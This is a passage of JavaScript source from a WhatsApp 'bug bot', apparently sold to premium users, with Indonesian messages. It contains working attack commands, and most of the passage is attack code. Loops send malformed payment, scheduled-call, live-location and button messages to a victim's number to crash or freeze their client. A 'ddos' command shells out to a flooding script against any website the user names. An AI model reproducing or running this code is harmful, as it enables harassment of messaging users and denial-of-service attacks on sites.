,'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20WARNING\x20!!!\x20💣💥\x20☣️','id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'urlButton':{'displayText':_0x49e64a(0x1b9),'url':_0x49e64a(0x1bf)}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'callButton':{'displayText':_0x49e64a(0x1b9),'phoneNumber':''}},{'quickReplyButton':{'displayText':_0x49e64a(0x1b9),'id':''}},{'quoted':lep}]}));
await sleep(500)
}
kalz.sendMessage(m.chat, {text:`Jenis Bug : ${command}\nTarget : @${bacot.split('@')[0]}\nStatus : Berhasil\n\nJANGAN LUPA JEDA 5 MENIT !\nBY BOT BUG VIP V2`, mentions: [bacot]})
}
break

case 'xioscrash':
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
kalz.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'xioscrash2':{
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
kalz.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break
case 'xcrash':{
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
kalzdown(pushname,victim)
await sleep(3000)
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'xcrash2':
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
kalzdown(pushname,m.chat)
await sleep(3000)
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'amountbug': {
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${kalz1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
break
case 'pmbug' :{
 if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
 if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${kalz1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPrem) return reply('Khusus Pengguna Premium! , Silakan Upgrade Premium Ke +62 895-2811-8070')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = kalz2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
kalz.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break

case 'zero-bug': case 'bug-s': {
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply('Proses bug 😈...')
for (let j = 0; j < 30; j++) {
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`Berhasil Kirim Bug ke ${bijipler} 🔥.`)
}
break

case 'ddos': case 'mix':{
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          kalzx(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          kalzx(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         }
                break
case 'playt':
  
			reply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Title    : *${data.result.title}*\n`
						caption += `❖ Size     : *${data.result.size}*`
						kalz.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
							kalz.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
			
			case 'bgtes': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await kalz.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'kalz Execution Vault', author: 'SirChan' })
}
}
break

case 'bugkrek': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `X-CoDe 🕴️ `,
    "sequenceNumber": "0",
    "jpegThumbnail": thumb
     }
  }
}
}), { userJid: m.chat, quoted: force })
await kalz.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await reply('✅Succes')
}
break
//=================================================//
case 'bugpepek': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `X-code 🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await kalz.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await reply('✅Succes')
}
break
//=================================================//
case 'bijiloe': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 6287392784527|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
